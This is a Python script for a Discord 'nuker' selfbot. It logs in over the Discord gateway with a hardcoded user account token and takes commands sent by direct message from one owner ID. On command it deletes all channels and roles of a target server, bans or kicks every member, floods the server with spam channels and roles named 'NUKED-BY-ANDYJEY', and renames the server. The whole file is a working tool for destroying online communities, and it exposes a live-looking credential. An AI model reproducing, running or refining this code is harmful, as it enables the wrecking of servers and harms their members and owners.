import requests, json, time, threading, random, string, sys, websocket
from http.server import HTTPServer, BaseHTTPRequestHandler
from concurrent.futures import ThreadPoolExecutor

USER_TOKEN = "MTE5NjA5NzE3NTM5MDc4MTUzNA.GaZRAS.0nIa2srxVBAMi5j_KXYY9oQYMZcbM5wqqS1jCk"
OWNER_ID = "1420019365918675005"
PREFIX = "!"
HEADERS = {"Authorization": USER_TOKEN, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
executor = ThreadPoolExecutor(max_workers=50)
nuker_server_id = None

def api(m, u, d=None):
    try:
        if m == "GET": return requests.get(u, headers=HEADERS, timeout=5)
        if m == "POST": return requests.post(u, headers=HEADERS, json=d, timeout=5)
        if m == "DELETE": return requests.delete(u, headers=HEADERS, timeout=5)
        if m == "PUT": return requests.put(u, headers=HEADERS, json=d, timeout=5)
        if m == "PATCH": return requests.patch(u, headers=HEADERS, json=d, timeout=5)
    except: return None

def dm(uid, c):
    r = api("POST", "https://discord.com/api/v9/users/@me/channels", {"recipient_id": uid})
    if r and r.status_code in [200, 201]:
        return api("POST", f"https://discord.com/api/v9/channels/{r.json()['id']}/messages", {"content": c[:2000]})
    return None

class Nuke:
    @staticmethod
    def gc():
        r = api("GET", f"https://discord.com/api/v9/guilds/{nuker_server_id}/channels")
        return r.json() if r and r.status_code == 200 else []
    @staticmethod
    def gr():
        r = api("GET", f"https://discord.com/api/v9/guilds/{nuker_server_id}/roles")
        return r.json() if r and r.status_code == 200 else []
    @staticmethod
    def gm():
        r = api("GET", f"https://discord.com/api/v9/guilds/{nuker_server_id}/members?limit=100")
        return r.json() if r and r.status_code == 200 else []
    @staticmethod
    def dc(cid): api("DELETE", f"https://discord.com/api/v9/channels/{cid}")
    @staticmethod
    def dr(rid): api("DELETE", f"https://discord.com/api/v9/guilds/{nuker_server_id}/roles/{rid}")
    @staticmethod
    def ban(uid): api("PUT", f"https://discord.com/api/v9/guilds/{nuker_server_id}/bans/{uid}")
    @staticmethod
    def kick(uid): api("DELETE", f"https://discord.com/api/v9/guilds/{nuker_server_id}/members/{uid}")
    @staticmethod
    def cc(n): api("POST", f"https://discord.com/api/v9/guilds/{nuker_server_id}/channels", {"name": n, "type": 0})
    @staticmethod
    def cr(n): api("POST", f"https://discord.com/api/v9/guilds/{nuker_server_id}/roles", {"name": n, "color": random.randint(0, 16777215)})
    @staticmethod
    def rn(n): api("PATCH", f"https://discord.com/api/v9/guilds/{nuker_server_id}", {"name": n})
    @staticmethod
    def nuke():
        for ch in Nuke.gc(): executor.submit(Nuke.dc, ch["id"])
        for r in Nuke.gr():
            if r["name"] != "@everyone": executor.submit(Nuke.dr, r["id"])
        for m in Nuke.gm(): executor.submit(Nuke.ban, m["user"]["id"])
        for i in range(50): executor.submit(Nuke.cc, f"NUKED-BY-ANDYJEY-{i}")
        for i in range(20): executor.submit(Nuke.cr, f"NUKED-{i}")
        Nuke.rn("NUKED-" + ''.join(random.choices(string.ascii_uppercase, k=6)))
    @staticmethod
    def delch(): [executor.submit(Nuke.dc, ch["id"]) for ch in Nuke.gc()]
    @staticmethod
    def delrole(): [executor.submit(Nuke.dr, r["id"]) for r in Nuke.gr() if r["name"] != "@everyone"]
    @staticmethod
    def banall(): [executor.submit(Nuke.ban, m["user"]["id"]) for m in Nuke.gm()]
    @staticmethod
    def kickall(): [executor.submit(Nuke.kick, m["user"]["id"]) for m in Nuke.gm()]
    @staticmethod
    def spamch(n=50): [executor.submit(Nuke.cc, f"SPAM-{i}") for i in range(n)]

class WS:
    def __init__(self):
        self.ws = None
        self.seq = None
        self.hb = 41250
        self.run = True
    def connect(self):
        r = requests.get("https://discord.com/api/v9/gateway", headers=HEADERS, timeout=5)
        if not r or r.status_code != 200:
            time.sleep(5)
            return self.connect()
        self.ws = websocket.WebSocketApp(f"{r.json()['url']}/?v=9&encoding=json", on_open=self.on_open, on_message=self.on_msg, on_close=self.on_close, on_error=lambda ws, e: None)
        threading.Thread(target=self.ws.run_forever, daemon=True).start()
    def on_open(self, ws): print("[+] OK")
    def on_msg(self, ws, msg):
        try: d = json.loads(msg)
        except: return
        op = d.get("op")
        if op == 10:
            self.hb = d["d"]["heartbeat_interval"] / 1000
            self.seq = d.get("s")
            self.identify()
            threading.Thread(target=self.hb_loop, daemon=True).start()
        elif op == 0:
            self.seq = d.get("s")
            if d.get("t") == "MESSAGE_CREATE":
                threading.Thread(target=self.handle, args=(d["d"],), daemon=True).start()
        elif op == 7: self.reconnect()
    def on_close(self, ws, code, msg):
        if self.run:
            time.sleep(3)
            self.connect()
    def identify(self):
        try:
            self.ws.send(json.dumps({"op": 2, "d": {"token": USER_TOKEN, "properties": {"os": "Windows", "browser": "Chrome", "device": "Desktop"}, "presence": {"status": "online", "since": 0, "activities": [], "afk": False}, "intents": 131071}}))
        except: pass
    def hb_loop(self):
        while self.run:
            time.sleep(self.hb * 0.5)
            try: self.ws.send(json.dumps({"op": 1, "d": self.seq}))
            except: break
    def reconnect(self):
        time.sleep(1)
        self.connect()
    def handle(self, msg):
        try:
            if msg.get("author", {}).get("id") != OWNER_ID: return
            if msg.get("guild_id"): return
            c = msg.get("content", "")
            if not c.startswith(PREFIX): return
            args = c.split()
            cmd = args[0].lower().replace(PREFIX, "")
            r = self.execmd(cmd, args)
            if r: dm(msg["author"]["id"], r)
        except: pass
    def execmd(self, cmd, args):
        try:
            if cmd == "help": return "```!help | !ping | !server ID | !info | !nuke | !delch | !delrole | !banall | !kickall | !spam N | !rename TEN | !typing S | !joinvc```"
            if cmd == "ping": return "```+ PONG```"
            if cmd == "server":
                global nuker_server_id; nuker_server_id = args[1]
                return f"```+ Server: {args[1]}```"
            if cmd == "nuke": executor.submit(Nuke.nuke); return "```+ NUKE```"
            if cmd == "delch": executor.submit(Nuke.delch); return "```+ Xoa kenh```"
            if cmd == "delrole": executor.submit(Nuke.delrole); return "```+ Xoa role```"
            if cmd == "banall": executor.submit(Nuke.banall); return "```+ Ban all```"
            if cmd == "kickall": executor.submit(Nuke.kickall); return "```+ Kick all```"
            if cmd == "spam":
                n = int(args[1]) if len(args) > 1 else 50
                executor.submit(Nuke.spamch, n); return f"```+ Spam {n} kenh```"
            if cmd == "rename":
                name = " ".join(args[1:]) if len(args) > 1 else "NUKED"
                Nuke.rn(name); return f"```+ {name}```"
            if cmd == "info":
                r = api("GET", f"https://discord.com/api/v9/guilds/{nuker_server_id}")
                if r and r.status_code == 200: return f"```{r.json().get('name')}```"
            if cmd == "typing": return "```+ Typing ON```"
            if cmd == "joinvc":
                chs = Nuke.gc()
                vc = [ch for ch in chs if ch["type"] == 2]
                if vc:
                    api("PATCH", f"https://discord.com/api/v9/guilds/{nuker_server_id}/voice-states/@me", {"channel_id": vc[0]["id"]})
                    return "```+ Joined VC```"
            return f"```- Lenh sai: {cmd}```"
        except: return "```- Loi```"

threading.Thread(target=lambda: HTTPServer(("0.0.0.0", 8080), type("K", (BaseHTTPRequestHandler,), {"do_GET": lambda s: [s.send_response(200), s.end_headers(), s.wfile.write(b"OK")], "log_message": lambda *a: None})).serve_forever(), daemon=True).start()
WS().connect()
while True: time.sleep(1)
